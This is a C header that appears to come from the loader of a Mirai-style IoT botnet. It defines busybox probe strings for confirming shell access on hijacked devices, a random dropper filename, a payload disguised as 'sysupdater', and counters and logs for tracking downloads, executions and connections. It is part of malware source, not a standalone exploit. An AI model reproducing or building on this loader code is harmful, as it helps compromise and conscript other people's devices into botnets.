#pragma once

#include <stdint.h>

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define TOKEN_QUERY "/bin/busybox KAIZEN"
#define TOKEN_RESPONSE "KAIZEN: applet not found"

#define EXEC_QUERY "/bin/busybox NEZIAK"
#define EXEC_RESPONSE "NEZIAK: applet not found"

#define FN_DROPPER "HiaKBzxMxO"
#define FN_BINARY "sysupdater"

// Debug and monitoring features
#define DEBUG_ENABLED 1
#define LOG_FILE "/tmp/loader_debug.log"
#define EXECUTION_LOG "/tmp/execution_tracking.log"
#define CONNECTION_LOG "/tmp/connection_monitor.log"

// Execution tracking
#define EXEC_SUCCESS "EXEC_SUCCESS"
#define EXEC_FAILED "EXEC_FAILED"
#define DOWNLOAD_SUCCESS "DOWNLOAD_SUCCESS"
#define DOWNLOAD_FAILED "DOWNLOAD_FAILED"
#define CONNECTION_SUCCESS "CONNECTION_SUCCESS"
#define CONNECTION_FAILED "CONNECTION_FAILED"

extern char *id_tag;